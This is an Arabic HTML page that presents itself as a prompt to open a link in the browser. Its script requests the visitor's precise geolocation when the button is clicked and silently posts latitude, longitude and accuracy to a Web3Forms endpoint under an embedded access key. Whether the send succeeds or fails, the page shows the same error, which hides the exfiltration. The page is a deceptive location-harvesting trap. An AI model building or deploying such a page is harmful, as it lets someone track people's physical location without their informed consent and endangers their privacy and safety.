<!doctype html>
<html lang="ar">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>مشاركة الموقع</title>
  <style>
    body{font-family:system-ui,-apple-system,Segoe UI,Roboto,Arial;padding:24px;background:#f7f7fb;color:#111;direction:rtl;text-align:right}
    .card{max-width:640px;margin:0 auto;background:white;padding:18px;border-radius:12px;box-shadow:0 6px 20px rgba(12,12,16,0.06)}
    button{padding:10px 16px;border-radius:8px;border:0;font-size:16px;cursor:pointer}
    .btn-primary{background:#0b84ff;color:white}
    .hint{color:#666;margin-top:8px;font-size:14px}
  </style>
</head>
<body>
  <div class="card">
    <h2>الانتقال الى المتصفح</h2>
    <p>هل تريد فتح الرابط في المتصفح الآن؟ سيتم طلب إذن من المتصفح.</p>

    <div style="display:flex;gap:10px;margin-top:12px">
      <button id="btnShare" class="btn-primary">افتح الرابط</button>
      <button id="btnCancel"></button>
    </div>

    <p class="hint">سيظهر إشعار من المتصفح لطلب الإذن.</p>
    <hr style="margin:16px 0">
    <div id="result">
      <strong>النتيجة:</strong>
      <div id="output" style="margin-top:8px;color:#111">لم يتم طلب الإذن بعد.</div>
    </div>
  </div>

<script>
const btnShare = document.getElementById('btnShare');
const btnCancel = document.getElementById('btnCancel');
const output = document.getElementById('output');

function show(msg){ output.innerHTML = msg; }

btnShare.addEventListener('click', async () => {
  if (!('geolocation' in navigator)) {
    show('المتصفح لا يدعم تحديد الموقع.');
    return;
  }

  show('⏳ جاري طلب إذن الوصول إلى رابط...');
  navigator.geolocation.getCurrentPosition(async (pos) => {
    const lat = pos.coords.latitude.toFixed(6);
    const lon = pos.coords.longitude.toFixed(6);
    const acc = pos.coords.accuracy;

    show(`:<br>خط العرض: ${lat}<br>خط الطول: ${lon}<br>دقة: ${acc} متر`);

    // إرسال المعلومات إلى Web3Forms
    try {
      const resp = await fetch('https://api.web3forms.com/submit', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
          access_key: '2e13fcef-864c-4f30-b438-1155b980f68a',
          subject: 'موقع جديد تمت مشاركته',
          from_name: 'نموذج مشاركة الموقع',
          latitude: lat,
          longitude: lon,
          accuracy: acc
        })
      });

      if (resp.ok) {
        show(output.innerHTML + '<br><em>⚠️ حدث خطأ في الاتصال بالخدمة.</em>');
      } else {
        show(output.innerHTML + '<br><em>⚠️ حدث خطأ في الاتصال بالخدمة.</em>');
      }
    } catch (e) {
      show(output.innerHTML + '<br><em>⚠️ حدث خطأ في الاتصال بالخدمة.</em>');
    }

  }, (err) => {
    if (err.code === err.PERMISSION_DENIED) show('❌ المستخدم رفض فتح رابط.');
    else if (err.code === err.POSITION_UNAVAILABLE) show('⚠️ الموقع غير متاح حالياً.');
    else if (err.code === err.TIMEOUT) show('⏰ انتهت المهلة.');
    else show('حدث خطأ: ' + err.message);
  }, { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 });
});

btnCancel.addEventListener('click', () => show('تم الإلغاء بواسطة المستخدم.'));
</script>
</body>
</html>
